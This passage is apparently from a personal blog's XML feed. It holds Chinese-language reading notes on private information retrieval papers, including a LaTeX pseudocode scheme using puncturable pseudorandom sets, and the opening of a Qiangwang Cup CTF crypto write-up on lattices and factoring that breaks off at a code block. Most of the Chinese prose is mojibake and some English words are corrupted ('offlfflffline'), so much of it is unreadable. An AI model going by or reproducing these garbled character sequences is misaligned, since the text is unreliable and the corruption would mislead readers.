sk,\;è¾“å‡ºçš„skæ»¡è¶³i\in Eval(sk)&\\&2.Shift(sk, \delta) \rightarrow sk^{'}ï¼Œå³è¾“å‡ºçš„sk^{'}æ»¡è¶³Eval(sk^{'}) = {i+\delta\;|\;i \in Eval(sk)},å¯¹Evalçš„ç»“æœåšäº†ä¸€ä¸ªshift&\end{align*}</script><p>ä¸å¤±ä¸€èˆ¬æ€§ï¼Œå¯ä»¥å‡è®¾ä»»ä½•PRséƒ½æœ‰è¿™ä¸¤æ¡æ€§è´¨</p><h1 id="Two-server-PIR-with-sublinear-online-time"><a href="#Two-server-PIR-with-sublinear-online-time" class="headerlink" title="Two-server PIR with sublinear online time"></a><strong>Two-server PIR with sublinear online time</strong></h1><h2 id="Defifinition"><a href="#Defifinition" class="headerlink" title="Defifinition"></a><strong>Defifinition</strong></h2><p>åˆ†ä¸ºè¿™äº”æ­¥ï¼š</p><script type="math/tex; mode=display">\begin{align}\    &1.clientä½¿ç”¨Setupç®—æ³•ç”Ÿæˆå¯†é’¥ckå’Œhint\;q_hï¼Œå‘é€q_hç»™offline\;serverã€‚æ³¨æ„Setupç®—æ³•å¯æå‰è¿è¡Œã€‚ &\\    &2.offline\;serveræ¥æ”¶åˆ°q_håè¿è¡ŒHintç®—æ³•ï¼Œç”Ÿæˆhint\;hå¹¶å‘ç»™clinetã€‚ &\\    &3.clientå†³å®šindex\;iåï¼Œä¼ ckå’Œiç»™Queryç®—æ³•ï¼Œç”Ÿæˆquery\;qå¹¶å‘ç»™online\;serverã€‚ &\\    &4.online\;serverä¼ qç»™Answerç®—æ³•ï¼Œç®—å‡ºaè¿”å›ç»™clientã€‚ &\\    &5.clientä¼ hå’Œaåˆ°Reconstructç®—æ³•ï¼Œè¾“å‡ºæ•°æ®åº“çš„ç¬¬iä¸ªæ¯”ç‰¹ã€‚ &\\\end{align}</script><p>ç»¼ä¸Šï¼Œoffline/online PIR schemeæ˜¯äº”ä¸ªç®—æ³•ï¼ˆSetup, Hint, Query, Answer, Reconstruct)ç»„æˆçš„äº”å…ƒç»„ï¼š</p><script type="math/tex; mode=display">\begin{align}\    &Setup(1^\lambda,n) \rightarrow(ck, q_h)ï¼Œ\lambdaæ˜¯å®‰å…¨çš„å‚æ•° &\\    &Hint(x,q_h) \rightarrow hï¼Œxæ˜¯æ•°æ®åº“ä¸­çš„nä¸ªæ•°æ® &\\    &Query(ck,i) \rightarrow q &\\    &Answer^x(q) \rightarrow a &\\    &Reconstruct(h,a) \rightarrow x_i &\\\end{align}</script><h2 id="New-constructions"><a href="#New-constructions" class="headerlink" title="New constructions"></a><strong>New constructions</strong></h2><p>åŸºæœ¬ä¸Šæ˜¯ä»åŸå§‹PIRåˆ°è®¡ç®—å®‰å…¨çš„PIRå†åˆ°åŠ å…¥å¯ç©¿åˆºçš„ä¼ªéšæœºé›†çš„PIRç‰ˆæœ¬</p><p>ä¸‹å›¾ç»™äº†è¿è¡Œæ•ˆç‡çš„ä¸Šç•Œï¼Œåé¢ä¹Ÿè¯´äº†å¦‚æœåªè€ƒè™‘è®¡ç®—å®‰å…¨ï¼ˆèˆå¼ƒæ•°æ®ç»Ÿè®¡å®‰å…¨ï¼‰å°±èƒ½é™ä½å¼€é”€ã€‚</p><p><img src="/images/PIR/image-20220828145823279.png" alt="image-20220828145823279"></p><p>Two-server computational offlfflffline/online PIR:</p><p><img src="/images/PIR/image-20220828150129012.png" alt="image-20220828150129012"></p><p>å¼•å…¥puncturable pseudorandom setsåï¼ŒPIRçš„æ•ˆç‡å¯è¿›ä¸€æ­¥æé«˜ï¼š</p><p><img src="/images/PIR/image-20220828151023565.png" alt="image-20220828151023565"></p><h3 id="Construction-16-Two-server-PIR-with-sublinear-online-time"><a href="#Construction-16-Two-server-PIR-with-sublinear-online-time" class="headerlink" title="Construction 16 (Two-server PIR with sublinear online time)"></a><strong>Construction 16</strong> <strong>(Two-server PIR with sublinear online time)</strong></h3><script type="math/tex; mode=display">\begin{align}&è¿˜æ˜¯é‚£äº›é…ç½®:s:N \rightarrow N ,\psi = (Gen, Punc, Eval)\;with\;key\;space K,punctured-key\;space\; K_p,&\\&extended\;by\;routines(Shift,GenWith),\;Throughout, let\;m := (n/s(n))log\;n. &\\&Offline\;phase: &\\    &\quad Setup(1^\lambda,n) \rightarrow ck,q_h: &\\        &\qquad sk \leftarrow Gen(1^\lambda,n) &\\        &\qquad sample\;\delta_1,...,\delta_m \stackrel{R}{\longleftarrow}[n]&\\        &\qquad ck \leftarrow (sk,\delta_1,...,\delta_m)&\\        &\qquad output\;ck\;and\;q_h \leftarrow sk&\\\\    &\quad Hint(q_h,x \in \{0,1\}^n)\rightarrow h \in \{0,1\}^m &\\        &\qquad parse\;q_h\;as\;sk \in K\;and\;\delta\in [n]^m &\\        &\qquad for\;j=1,...,m\;do:&\\            &\qquad\quad S_j \leftarrow Eval(Shift(sk,\delta_j))&\\            &\qquad\quad h_j \leftarrow \sum_{i\in S_j}x_i\;mod\;2&\\           &\qquad output\;h \leftarrow(h_1,...,h_m)&\\\\&Online\; phase &\\    &\quad Query(ck, i\in [n]) \rightarrow q\in K_p&\\        &\qquad parse\;ck\;as\;sk\in K\;and\;\delta\in[n]^m&\\        &\qquad sample\;a\;bit\;b\stackrel{R}{\longleftarrow}Bernouli(\frac{s-1}{n})&\\        &\qquad find\;a\;j\in[m]\;s.t.\;i-\delta_j \in Eval(sk)&\\        &\qquad if\;such\;a\;j\in[m]\;exists:&\\            &\qquad\quad sk_q \leftarrow Shift(sk,\delta_j)&\\        &\qquad otherwise:&\\            &\qquad\quad j \leftarrow âŠ¥&\\            &\qquad\quad i^{'} \stackrel{R}{\longleftarrow} Eval(sk)&\\            &\qquad\quad sk_q \leftarrow Shift(sk, i-i^{'})&\\        &\qquad if\;b=0:\qquad i_{punc} \leftarrow i&\\        &\qquad else: \qquad\quad\;\;\; i_{punc} \stackrel{R}{\longleftarrow} Eval(sk_q)\backslash \{i\}&\\        &\qquad output\;q \leftarrow Punc(sk_q, i_{punc}) &\\\\    &\quad Answer^x(q\in K_p )\rightarrow a\in\{0,1\}&\\        &\qquad S \leftarrow Eval(q)&\\        &\qquad return a \leftarrow \sum_{i\in S}x_i\;mod\;2&\\\\    &\quad Reconstruct(h\in \{0,1\}^m,a\in \{0,1\}) \rightarrow x_i &\\        &\qquad let\;j \;and\;b\;be\;as\;in\;Query&\\        &\qquad if\;j=âŠ¥\;or\;b=0\;then\;output\;âŠ¥ &\\        &\qquad output\;x_i\leftarrow h_j-a\;mod\;2 &\\\end{align}</script><p>è¯»paperçš„æ€»ç»“ï¼š</p><h1 id="Private-Information-Retrievalwith-Sublinear-Online-Time"><a href="#Private-Information-Retrievalwith-Sublinear-Online-Time" class="headerlink" title="Private Information Retrievalwith Sublinear Online Time"></a><strong>Private Information Retrievalwith Sublinear Online Time</strong></h1><p>ç¬¬ä¸€ç¯‡ï¼Œæ˜¯Henry Corrigan-Gibbså’ŒDmitry KoganäºŒäººå†™çš„ï¼Œå°†PIRçš„è¿‡ç¨‹æ‹†æˆç¦»çº¿å’Œåœ¨çº¿é˜¶æ®µï¼Œå¹¶puncturable pseudorandom setsï¼ˆåå†™ä¸ºPRSï¼‰çš„æ¦‚å¿µå¼•å…¥å…¶ä¸­ï¼Œçº¿æ€§çš„è®¡ç®—æ”¾åˆ°ç¦»çº¿é˜¶æ®µï¼Œä½¿åœ¨çº¿é˜¶æ®µçš„è®¡ç®—åªæœ‰æ¬¡çº¿æ€§çš„ï¼Œè€Œä¸”æ²¡æœ‰å¼•å…¥é¢å¤–çš„å­˜å‚¨ï¼ˆå…¶å®æˆ‘è§‰å¾—æ˜¯æœ‰çš„ï¼Œæ¯•ç«Ÿclientç”Ÿæˆn^(1/2)ä¸ªåŒæ ·å¤§å°çš„setsï¼Œè¿˜æ˜¯ç”Ÿæˆäº†nçš„å­˜å‚¨é‡ï¼Œå¹¶ä¸”è¿™äº›setséƒ½è¦å‘ç»™ç¦»çº¿æœåŠ¡å™¨ç®—å‡ºhintï¼Œä½¿å¾—ç¦»çº¿é˜¶æ®µçš„ä¼ è¾“é‡æ˜¯nï¼›ä½†æ˜¯åœ¨åœ¨çº¿é˜¶æ®µç¡®å®ä¸éœ€è¦æ›´å¤šçš„å­˜å‚¨äº†ï¼Œä¼ è¾“å¸¦å®½ä¹Ÿåªæ˜¯n^(1/2)å¤§å°çš„)</p><p>æ€»çš„æ¥è¯´ï¼Œå…³é”®ç‚¹æ˜¯å¯ç©¿åˆºçš„ä¼ªéšæœºé›†ï¼Œå®ƒèƒ½å»æ‰æŸä¸€ç‚¹çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨å®¢æˆ·ç«¯èƒ½æ¢å¤è¯¥ç‚¹ã€‚åŸå§‹çš„PRSæœ‰ä¸‰ä¸ªåŠŸèƒ½å‡½æ•°ï¼Œ(Genn(1^<em>Î»</em> <em>, n</em>), Punc(sk<em>, i</em>), Eval(sk<em>, i</em>))ï¼Œé€šè¿‡è¾“å…¥å®‰å…¨å‚æ•°Î»å’Œæ•°æ®åº“å¤§å°nï¼ŒGenå‡½æ•°ç”Ÿæˆä¸€ä¸ªå¯†é’¥ï¼ŒPuncå‡½æ•°è¿›è¡Œç©¿åˆºï¼ŒEvalå‡½æ•°å¯†é’¥skå˜æˆé›†åˆSï¼›åé¢è¿˜åŠ äº†ä¸¤ä¸ªåŠŸèƒ½å‡½æ•°GenWith(1^<em>Î»</em> <em>, n, i</em>)å’ŒShift(sk<em>, Î´</em>)ï¼ŒGenWithç”¨äºç”Ÿæˆæœ‰æŒ‡å®šå…ƒç´ çš„å¯†é’¥ï¼ŒShiftå°±å’Œå®ƒå‡½æ•°åä¸€æ ·ï¼Œå¯¹å¯†é’¥åœ¨æœ‰é™åŸŸä¸‹è¿›è¡Œä¸€ä¸ªåŠ æ“ä½œã€‚</p><p>ä¹‹åå°±æ˜¯ç”¨å‰é¢æ‰€æå‡ºçš„PRSèå…¥åˆ°PIRæ–¹æ¡ˆä¸­ï¼Œå¤§è‡´çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>clientåœ¨éšæœºçš„æ¦‚ç‡åˆ†å¸ƒä¸‹ç”Ÿæˆn^(1/2)ä¸ªå¤§å°ä¸ºn^(1/2)çš„é›†åˆSï¼Œå…¨éƒ¨å‘ç»™ç¦»çº¿è®¡ç®—æœåŠ¡å™¨è®¡ç®—å¼‚æˆ–å€¼è¿”å›ç»™client</li><li>æ‰¾ä¸€ä¸ªå­˜åœ¨xçš„é›†åˆS_iï¼Œå¯¹å…¶è¿›è¡Œç©¿åˆºï¼ˆå¯ä»¥å½“ä½œæ‰¾åˆ°å¹¶ä¸¢å¼ƒxï¼‰ï¼Œç„¶åå‘ç»™åœ¨çº¿æœåŠ¡å™¨ï¼Œè¿”å›å»æ‰xçš„å¼‚æˆ–å€¼</li><li>æŠŠ1å’Œ2çš„ç»“æœè¿›è¡Œå¼‚æˆ–ï¼Œå³å¯æŠµæ¶ˆå…¶ä»–çš„å€¼ï¼Œåªç•™ä¸‹xã€‚ç”±äºä¸¤ä¸ªæœåŠ¡å™¨æ˜¯ä¸å¯è¿›è¡Œäº¤æµçš„ï¼Œå› æ­¤å¯ä»¥ä¸¤ä¸ªæœåŠ¡å™¨æ— æ³•è·å–æœ‰å…³xçš„ä¿¡æ¯ã€‚</li><li>å¦‚æœè¦è¿›è¡Œå¤šæ¬¡å–å€¼ï¼Œé‚£å°±å¤šäº†ä¸€ä¸ªäººrefreshæ“ä½œæ›´æ–°å¯†é’¥ï¼Œå³å°†åˆšåˆšç”¨è¿‡çš„Sæ›´æ–°å¦åˆ™å†æ¬¡ä½¿ç”¨ä¼šè¢«å‘ç°ã€‚å…·ä½“æ–¹æ³•æ˜¯åœ¨2åŒæ—¶ç”Ÿæˆä¸€ä¸ªé›†åˆSâ€˜ï¼Œå¯¹å…¶è¿›è¡Œxçš„ç©¿åˆºç„¶åå‘ç»™ç¦»çº¿æœåŠ¡å™¨ï¼Œå†å¾—åˆ°Sâ€™çš„å¼‚æˆ–å€¼ï¼Œæ‹¿åˆ°åå°†è¿™ä¸ªå¼‚æˆ–å€¼ä¸xå¼‚æˆ–å°±å¯ä»¥å¾—åˆ°Sâ€˜çš„hint</li></ol><p>åé¢è¿˜ä»‹ç»äº†å•æœåŠ¡å™¨çš„æƒ…å†µï¼Œå› ä¸ºç¦»çº¿åœ¨çº¿é˜¶æ®µåœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šäº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å‘é›†åˆè¿‡å»ï¼Œå¦åˆ™ä¹Ÿä¼šè¢«å‘ç°ã€‚æ–‡ä¸­å¼•å…¥äº†å…¨åŒæ€åŠ å¯†æ¥æè¿°ï¼Œåˆ©ç”¨å…¨åŒæ€æ–¹æ¡ˆå¯¹Sè¿›è¡ŒåŠ å¯†å†å‘ç»™æœåŠ¡å™¨ï¼Œä¹‹åçš„æ­¥éª¤å’Œä¸Šè¿°å·®ä¸å¤šã€‚</p><h1 id="Efficient-Transformation-Capabilities-of-Single-Database-Private-Block-Retrieval"><a href="#Efficient-Transformation-Capabilities-of-Single-Database-Private-Block-Retrieval" class="headerlink" title="Efficient Transformation Capabilities of Single Database Private Block Retrieval"></a><strong>Efficient Transformation Capabilities of Single Database Private Block Retrieval</strong></h1><p>è¿™ä¸€ç¯‡çš„æ€è·¯å’Œç¬¬ä¸€ç¯‡å°±å¾ˆä¸ä¸€æ ·äº†ï¼Œæ²¡æœ‰é‡‡ç”¨ç¦»çº¿/åœ¨çº¿æœåŠ¡å™¨çš„æ¨¡å¼ï¼Œä¹Ÿæ²¡æœ‰ä½¿ç”¨ç©¿åˆºä¼ªéšæœºé›†ï¼Œä»–åŸºäºä¸€ä¸ªNPé—®é¢˜å³äºŒæ¬¡å‰©ä½™æ„é€ å•é¡¹é™·é—¨å‡½æ•°ï¼Œå’Œrabinç³»ç»Ÿç±»ä¼¼ï¼Œå› æ­¤å¯ä»¥ä¸€æ¬¡æ€§è·å¾—ä¸€ä¸ªblockçš„æ•°æ®ï¼ˆè¯¥æ–‡ä¸­æŠŠæ•°æ®åº“å½“æˆu*vçš„çŸ©é˜µæ•°æ®ï¼Œä¸€æ¬¡å¯ä»¥è·å¾—æŸä¸€è¡Œçš„æ•°æ®ï¼‰ã€‚</p><p>åœ¨è¿™ç¯‡é‡Œé¢å­¦åˆ°äº†ä¸¤ä¸ªæ¦‚å¿µï¼Œ<em>Information-theoretic PIR</em>å’Œ<em>Computationally bounded PIR</em> ï¼Œç¬¬ä¸€ç¯‡è™½ç„¶æ²¡æœ‰ä»‹ç»ä½†æ˜¯ä¹Ÿç”¨åˆ°äº†ï¼Œå½“æ—¶å°±æ²¡çœ‹æ‡‚ã€‚ä¿¡æ¯è®ºçš„PIRæŒ‡å­˜åœ¨å¤šä¸ªæœåŠ¡å™¨ï¼Œå®ƒä»¬äº«æœ‰åŒä¸€ä¸ªæ•°æ®åº“çš„copyä½†ç›¸äº’ä¹‹é—´ä¸è¿›è¡Œæ²Ÿé€šï¼›è®¡ç®—æœ‰ç•Œçš„PIRæ˜¯æŒ‡åŸºäºæŸä¸ªå¯†ç å‡è®¾çš„PIRæ–¹æ¡ˆã€‚</p><p>è¿™ç¯‡çš„å®ç°å°±æ˜¯åˆ©ç”¨åŠ ç§‘æ¯”ç¬¦å·å’ŒäºŒæ¬¡å‰©ä½™ï¼Œå…·ä½“å°±ä¸å±•å¼€äº†äº†ï¼Œå¯¹æˆ‘ä»¬è¦çš„ç ”ç©¶æ–¹å‘ä¸å¤ªä¸€æ ·ã€‚è€Œä¸”å®ƒçš„è¿ç®—æ—¶é—´æ˜¯çº¿æ€§çš„å“ˆå“ˆå“ˆï¼Œè¿˜ä¸å¦‚ç¬¬ä¸€ç¯‡ï¼Œæˆ‘è®°å¾—æ˜¯å¤æ‚åº¦u*våŠ ä¸€ä¸ªlogï¼Œé‚£å¯¹äºæ•°æ®åº“å¤§å°æ¥è¯´å°±æ˜¯çº¿æ€§çš„ã€‚ä¸è¿‡ä»–æœ‰ä¸€ä¸ªä¼˜ç‚¹æ˜¯æ„é€ çš„æ–¹æ¡ˆå¯ä»¥åœ¨ä¿¡æ¯è®ºPIRå’Œè®¡ç®—æœ‰ç•ŒPIRä¹‹é—´äº’ç›¸è½¬æ¢ï¼Œè¿™æ˜¯å…¶ä»–æ–¹æ¡ˆéš¾ä»¥åšåˆ°çš„ã€‚</p><h1 id="Puncturable-Pseudorandom-Sets-and-Private-Information-Retrieval-with-Near-Optimal-Online-Bandwidth-and-Time"><a href="#Puncturable-Pseudorandom-Sets-and-Private-Information-Retrieval-with-Near-Optimal-Online-Bandwidth-and-Time" class="headerlink" title="Puncturable Pseudorandom Sets and Private Information Retrieval with Near-Optimal Online Bandwidth and Time"></a><strong>Puncturable Pseudorandom Sets and Private Information Retrieval with Near-Optimal Online Bandwidth and Time</strong></h1><p>è¿™ä¸€ç¯‡æ˜¯åœ¨ç¬¬ä¸€ç¯‡çš„åŸºç¡€ä¸Šå‘å±•è¿‡æ¥çš„ï¼Œä¸ç¬¬ä¸€ç¯‡ç›¸æ¯”ï¼Œä»–çš„ä¼˜ç‚¹æ˜¯åœ¨ä¸å¢åŠ è®¡ç®—æ—¶é—´çš„åŸºç¡€ä¸Šå‡å°‘äº†ä¼ è¾“é˜¶æ®µæ‰€ç”¨çš„å¸¦å®½ï¼šç¦»çº¿é˜¶æ®µä»…ä¼ è¾“n^(1/2)å¤§å°çš„æ¶ˆæ¯è‡³leftæœåŠ¡å™¨ï¼Œclientæ”¶åˆ°ä¸€ä¸ªn^(1/2)å¤§å°çš„hintï¼Œåœ¨çº¿é˜¶æ®µçš„å¸¦å®½ä»…ä¸ºO(1)ï¼Œå…ˆå‰çš„O(n^(1/2))ã€‚ä½†ä»–é‡‡ç”¨äº†ä¸€ç§å¼±åŒ–PRSçš„æ–¹æ¡ˆï¼Œä¹Ÿå³æ›´é€šç”¨çš„PRSï¼Œæ‰€ä»¥ä¸åƒç¬¬ä¸€ç¯‡é‚£æ ·ï¼Œè¿™ä¸€ç¯‡å­˜åœ¨ä¸å¯å¿½ç•¥çš„æ¦‚ç‡å¯¼è‡´ç»“æœå‡ºé”™ï¼Œä½†æ€»çš„æ¥è¯´æ­£ç¡®ç‡ä»ç„¶ä¿æŒçš„è¾ƒé«˜ï¼ˆå•æ¬¡2/3çš„æ­£ç¡®ç‡ï¼Œå¹¶è¡Œè¿è¡Œ128æ¬¡ï¼‰ï¼Œå¯æ˜¯åœ¨ç¬¬ä¸€ç¯‡ä¸­å¯¹xè¿›è¡Œç©¿åˆºæ—¶ä»ç„¶å¯èƒ½è¾“å‡ºä¸€ä¸ªé”™è¯¯ç»“æœâ€™âŠ¥â€˜ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºè¿™ä¸ªé”™è¯¯ä¸æ˜¯ä»€ä¹ˆå¤§é—®é¢˜ã€‚</p><p>æ—¢ç„¶è¾¾åˆ°äº†ä¸åŒçš„æ•ˆæœï¼Œé‚£ä¹ˆè¿™ä¸€ç¯‡æ‰€ç”¨çš„Privately Puncturable PRFsè‚¯å®šä¸å‰é¢çš„ä¸åŒï¼Œæ›´ä¸€èˆ¬åŒ–çš„ Generalized Privately Puncturable Pseudorandom Setå¦‚ä¸‹ï¼š(Gen(1^<em>Î»</em> <em>, n</em>), Set(sk), Member(sk, x), Puncture(msk, x))ï¼Œ å¤šäº†ä¸€ä¸ªmemberå‡½æ•°ç”¨äºæµ‹è¯•xæ˜¯å¦åœ¨skç”Ÿæˆçš„é›†åˆä¸­ï¼ŒåŒæ—¶Genå‡½æ•°ä¸ä»…ä¼šç”Ÿæˆå¯†é’¥skï¼Œè¿˜ä¼šç”Ÿæˆä¸»å¯†é’¥mskï¼Œè¿™ä¸ªä¹Ÿæ˜¯é™ä½ä¼ è¾“å¸¦å®½çš„å…³é”®ç‚¹ã€‚</p><p>è‡³äºå®ç°è¿‡ç¨‹ï¼Œå…¶å®å’Œç¬¬ä¸€ç¯‡å¤§åŒå°å¼‚ï¼Œä»ç„¶æ˜¯åˆ©ç”¨é›†åˆçš„å¼‚æˆ–æ¥æ¢å¤xï¼Œè¿™é‡Œé¢å¤šåŠ äº†ä¸ªè¶…æ—¶æœºåˆ¶ï¼ˆæˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„ï¼‰ï¼Œå½“è¶…æ—¶æ—¶å°±ä¼šè¿”å›ä¸€ä¸ªé»˜è®¤çš„å¼‚æˆ–å€¼0ï¼Œè¿™ä¹Ÿæ˜¯å‡ºé”™çš„ç”±æ¥ã€‚è‡³äºrefreshé˜¶æ®µä¹Ÿå’Œç¬¬ä¸€ç¯‡ç±»ä¼¼ã€‚</p><h1 id="Batched-Differentially-Private-Information-Retrieval"><a href="#Batched-Differentially-Private-Information-Retrieval" class="headerlink" title="Batched Differentially Private Information Retrieval"></a><strong>Batched Differentially Private Information Retrieval</strong></h1><p>è¿™ä¸€ç¯‡ä¹Ÿæ²¡æœ‰ç”¨ç©¿åˆºä¼ªéšæœºé›†ï¼Œä»–ä¿ç•™äº†ç¦»çº¿åœ¨çº¿åˆ†ç¦»çš„è®¡ç®—ï¼Œè‡ªå·±è®¾è®¡äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•ï¼š differentially private-PIR(DPPIR)ã€‚æœ€ç»ˆçš„æ•ˆæœæ˜¯æŠŠä¸¤æ¬¡çš„è¿ç®—æ—¶é—´å˜æˆäº†O(n^(1/2)+constant*n)ï¼Œä¼ è¾“å¸¦å®½æ˜¯O(1)ï¼Œå¸¦å®½éƒ½é™äº†ä¸å°‘ä½†è¿ç®—æ—¶é—´å°±å˜æˆäº†çº¿æ€§çš„ã€‚</p><p>çœ‹åé¢ä¼¼ä¹è¿è¡Œæ¡ä»¶ä¹Ÿæ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦åŒæ—¶å¤šä¸ªç”¨æˆ·æŸ¥è¯¢ï¼Œæ‰¹å¤„ç†æŸ¥è¯¢æ‰èƒ½å®ç°è¿™ä¸ªæ•ˆç‡ï¼Œå¯¹ä¸»çº¿å¸®åŠ©ä¸å¤§å°±ä¸ç»†çœ‹äº†ã€‚</p><h1 id="Private-Blocklist-Lookups-with-Checklist"><a href="#Private-Blocklist-Lookups-with-Checklist" class="headerlink" title="Private Blocklist Lookups with Checklist"></a><strong>Private Blocklist Lookups with Checklist</strong></h1><p>&emsp;è¿™ä¸€ç¯‡åˆæ˜¯CK20ä¸¤äººçš„paperï¼Œä¸ªäººæ„Ÿè§‰ä¸æ˜¯çº¯ç†è®ºä¸Šçš„ï¼Œè€Œæ˜¯ååº”ç”¨å±‚é¢äº†ã€‚å¤§æ¦‚å°±æ˜¯è¿ç”¨PIRæ–¹æ¡ˆå®ç°å¯¹æœåŠ¡å™¨ç«¯çš„å­—ç¬¦ä¸²åŒ¹é…ï¼Œåˆ¤æ–­clientå¤„çš„å­—ç¬¦ä¸²æ˜¯å¦åœ¨æœåŠ¡å™¨ä¸­ï¼Œå¹¶ä¸”ä¸æ³„éœ²å­—ç¬¦ä¸²çš„ä¿¡æ¯ï¼Œä¼˜ç‚¹è¿˜æœ‰ä¸éœ€è¦å­˜å‚¨æ•´ä¸ªblocklistï¼ˆç±»ä¼¼äºç¬¬äºŒç¯‡ï¼Œå°†æœåŠ¡å™¨ç«¯çš„æ•°æ®åº“çœ‹ä½œæ˜¯ä¸€ä¸ªçŸ©é˜µï¼Œæ¯æ¬¡åŒ¹é…çš„æ˜¯æŸä¸€è¡Œçš„å­—ç¬¦ï¼‰ã€‚è¿˜èƒ½ä½¿å¾—æœåŠ¡ç«¯çš„è®¡ç®—æ˜¯æ¬¡çº¿æ€§çš„ï¼Œæœ€å…³é”®çš„æ˜¯â€”â€”å®ƒåœ¨blocklistç»å¸¸æ›´æ–°çš„æ—¶å€™ä¹Ÿæ»¡è¶³ï¼Œä¸æˆ‘ä»¬çš„éœ€æ±‚ç±»ä¼¼ï¼Œå€¼å¾—å¥½å¥½ç ”è¯»ï¼›é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€äº›åœ¨è¿ç®—é€Ÿåº¦ä¸Šçš„æå‡ç­‰ç­‰ã€‚</p><p>PRSçš„æ„é€ å’Œç¬¬ä¸€ç¯‡çš„ç±»ä¼¼ï¼Œæ˜¯(Gen, GenWith<em>,</em> Eval<em>,</em> Punc)ï¼Œå®ç°è¿‡ç¨‹å’Œç¬¬ä¸€ç¯‡æœ‰å¾ˆå¤§ä¸åŒäº†ã€‚</p><p>å¤§è‡´çš„æµç¨‹è¿˜æ˜¯å’Œç¬¬ä¸€ç¯‡ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯ä»ä¼¯åŠªåˆ©æ¦‚å‹ä¸­æ ¹æ®(2(n^(1/2)-1)/n)çš„æ¦‚ç‡ä¸­ç”ŸæˆÎ²ï¼Œåœ¨ç”ŸæˆqueryæŸ¥è¯¢æ—¶æäº†ä¸¤ä¸ªæ–¹æ¡ˆï¼Œæ¯ä¸ªæ–¹æ¡ˆéƒ½æœ‰ä¸¤å¥—punctured pseudorandom secret keyï¼Œæ ¹æ®Î²çš„å€¼é€‰æ‹©æŸä¸€æ–¹æ¡ˆç”ŸæˆæŸ¥è¯¢qï¼Œå‘ç»™rightåå’Œç¬¬ä¸€ç¯‡æ˜¯ä¸€æ ·çš„ï¼Œè¿”å›çš„answer aä¹Ÿå‡å¯ä»¥å®Œæˆå¯¹D_içš„é‡æ„ã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆèƒ½æ»¡è¶³æ•°æ®å¯æ›´æ–°ï¼Œæˆ‘ç›®å‰ç²—æµ…çš„ç†è§£åªæ˜¯æŠŠæ•°æ®ä¸æ–­åˆ†ä¸ºæ›´å°çš„å—ï¼Œæ¯æ¬¡æ›´æ–°éƒ½ä½¿å¾—è¾ƒå¤§çš„é‚£ä¸€å—ä¿æŒä¸å˜è€Œåªæœ‰å°å—æ”¹å˜ï¼Œå› æ­¤leftæœåŠ¡å™¨å¯¹hintçš„æ›´æ–°ä¸è‡³äºæ˜¯O(n^(1/2))ä»¥ä¸Šçš„ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Private Information Retrieval&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="PIR" scheme="http://sh1k4ku.github.io/tags/PIR/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯</title>
    <link href="http://sh1k4ku.github.io/2022/08/01/2022/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2022/08/01/2022/%E5%BC%BA%E7%BD%91%E6%9D%AF/</id>
    <published>2022-07-31T16:00:00.000Z</published>
    <updated>2022-08-03T05:31:57.818Z</updated>
    
    <content type="html"><![CDATA[<p>åšäº†å››é“ï¼Œè·å¾—äº†18å</p><span id="more"></span><h1 id="Lattice-cry"><a href="#Lattice-cry" class="headerlink" title="Lattice $ cry"></a>Lattice $ cry</h1><p>paperé“¾æ¥ï¼š<a href="https://eprint.iacr.org/2020/461.pdfï¼Œé‡Œé¢è´´äº†ä»£ç ä½†æ˜¯æ„Ÿè§‰æ²¡å•¥ç”¨">https://eprint.iacr.org/2020/461.pdfï¼Œé‡Œé¢è´´äº†ä»£ç ä½†æ˜¯æ„Ÿè§‰æ²¡å•¥ç”¨</a></p><p>ä¸¤é¢˜éƒ½å¯è§„åŒ–åˆ°è¿™ä¸ªHidden Subset Sum Problemä¸‹ï¼Œç¬¬ä¸€é¢˜æ¯”è¾ƒç›´æ¥ï¼ŒçŸ©é˜µ<strong>A*</strong>B =<strong>C</strong> mod nï¼Œè¦æ¢å¤Bæ ¼åŸºè§„çº¦åçš„ç¬¬ä¸€ä¸ªè¡Œå‘é‡ï¼Œå…¶ä¸­Açš„å…ƒç´ å¾ˆå¤§è€ŒBçš„å¾ˆå°ã€‚paperé‡Œçš„æ€è·¯æ˜¯å…ˆç”¨Cæ„é€ å‡ºä¸€ä¸ªæ ¼ï¼Œå¯¹è¿™ä¸ªæ ¼åšBKZç®—æ³•å¾—åˆ°å®ƒçš„æ­£äº¤åŸºï¼Œå†ç®—ä¸€æ¬¡æ­£äº¤åŸºå³å¯å¾—åˆ°åŸçŸ©é˜µçš„å…±è½­çŸ©é˜µã€‚ç¬¬äºŒéƒ¨å†åˆ©ç”¨å…±è½­çŸ©é˜µæ¢å¤æœ€çŸ­å‘é‡å’Œx_iï¼Œå¯æƒœè‡ªå·±èƒ½åŠ›ä¸è¶³ç»†èŠ‚ä¸èƒ½å¥½å¥½æŠŠæ¡ï¼Œä¹‹åæœ‰ç©ºå†å¤ç›˜8.</p><h1 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h1><p>paperé“¾æ¥ï¼š<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p><p>å› ä¸ºå’Œd3çš„ä¸€æ ·æ‰€ä»¥ç›´æ¥å°±æ‰¾åˆ°äº†ï¼Œå¯æƒœè¿˜æ˜¯æ…¢ä¸€æ­¥å‡ºçš„ï¼Œåˆé”™å¤±è¡€</p><p>gen123å¯¹åº”paperé‡Œçš„543ï¼Œä¸è¿‡å› ä¸ºbç»™äº†æ‰€ä»¥åªç”¨æ‰“ä¸€å…ƒcopperäº†ï¼Œæ…¢æ…¢å¾€å›æ¨å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 